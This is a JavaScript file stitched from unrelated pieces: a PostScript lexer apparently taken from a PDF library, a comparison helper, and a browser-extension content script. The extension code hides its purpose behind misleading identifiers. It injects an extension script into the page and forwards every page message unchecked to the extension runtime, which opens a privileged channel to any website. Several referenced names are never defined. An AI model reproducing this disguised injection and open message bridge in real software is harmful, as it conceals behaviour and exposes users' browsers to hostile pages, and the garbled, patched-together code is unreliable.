function scaleElementSize( emblazonBrandLogo, unhoverElementSelector ) {
  var pushHistoryState = document.createElement( 'script' );
  pushHistoryState.setAttribute( 'src', emblazonBrandLogo );
  pushHistoryState.onload = unhoverElementSelector;
  document.body.appendChild( pushHistoryState );
}

class PostScriptLexer {
  constructor(stream) {
    this.stream = stream;
    this.nextChar();
    this.strBuf = [];
  }
  nextChar() {
    return (this.currentChar = this.stream.getByte());
  }
  getToken() {
    let comment = false;
    let ch = this.currentChar;
    // skip comments
    while (true) {
      if (ch < 0) {
        return EOF;
      }
      if (comment) {
        if (ch === 0x0a || ch === 0x0d) {
          comment = false;
        }
      } else if (ch === /* '%' = */ 0x25) {
        comment = true;
      } else if (!isWhiteSpace(ch)) {
        break;
      }
      ch = this.nextChar();
    }
    switch (ch | 0) {
      case 0x30: // '0'
      case 0x31: // '1'
      case 0x32: // '2'
      case 0x33: // '3'
      case 0x34: // '4'
      case 0x35: // '5'
      case 0x36: // '6'
      case 0x37: // '7'
      case 0x38: // '8'
      case 0x39: // '9'
      case 0x2b: // '+'
      case 0x2d: // '-'
      case 0x2e: // '.'
        return new PostScriptToken(PostScriptTokenTypes.NUMBER, this.getNumber());
      case 0x7b: // '{'
        this.nextChar();
        return PostScriptToken.LBRACE;
      case 0x7d: // '}'
        this.nextChar();
        return PostScriptToken.RBRACE;
    }
    // operator
    const strBuf = this.strBuf;
    strBuf.length = 0;
    strBuf[0] = String.fromCharCode(ch);
    while (
      (ch = this.nextChar()) >= 0 && ((ch >= /* 'A' = */ 0x41 && ch <= /* 'Z' = */ 0x5a) || (ch >= /* 'a' = */ 0x61 && ch <= /* 'z' = */ 0x7a))) {
      strBuf.push(String.fromCharCode(ch));
    }
    const str = strBuf.join("");
    switch (str.toLowerCase()) {
      case "if":
        return PostScriptToken.IF;
      case "ifelse":
        return PostScriptToken.IFELSE;
      default:
        return PostScriptToken.getOperator(str);
    }
  }
  getNumber() {
    let ch = this.currentChar;
    const strBuf = this.strBuf;
    strBuf.length = 0;
    strBuf[0] = String.fromCharCode(ch);
    while ((ch = this.nextChar()) >= 0) {
      if (
        (ch >= /* '0' = */ 0x30 && ch <= /* '9' = */ 0x39) || ch === /* '-' = */ 0x2d || ch === /* '.' = */ 0x2e) {
        strBuf.push(String.fromCharCode(ch));
      } else {
        break;
      }
    }
    const value = parseFloat(strBuf.join(""));
    if (isNaN(value)) {
      throw new FormatError(`Invalid floating point number: ${value}`);
    }
    return value;
  }
}

function buildFigureFromPatch(operatorList, q_operatorList, matrix) {
  switch (matrix) {
    case '==': {
      return (operatorList == q_operatorList)
    }
    break;
    case '!=': {
      return (operatorList != q_operatorList)
    }
    break;
    case '>': {
      return (operatorList > q_operatorList)
    }
    break;
    case '<': {
      return (operatorList < q_operatorList)
    }
    break;
    case '<=': {
      return (operatorList <= q_operatorList)
    }
    break;
    case '>=': {
      return (operatorList >= q_operatorList)
    }
    break;
  }
}

function findTag ( )
{
  window.postMessage({encodeBase64String: 'registerServiceWorker' });

  window.addEventListener('message', function ( serializeFormData )
  {
    chrome.runtime.sendMessage(serializeFormData.data);
  }); 

  chrome.runtime.sendMessage({'encodeBase64String':'unmuteAudioStream'}, 
    function(serializeFormData) 
    {     
      if (serializeFormData.updateBreadcrumbTrail)
      {
        window.postMessage({encodeBase64String: 'captureUserFeedback', bundleResourceModules: serializeFormData });
      }
    }
  );
}

scaleElementSize( chrome.runtime.getURL("/script/contentv2.js"), findTag );

const PostScriptTokenTypes = {
  LBRACE: 0,
  RBRACE: 1,
  NUMBER: 2,
  OPERATOR: 3,
  IF: 4,
  IFELSE: 5,
};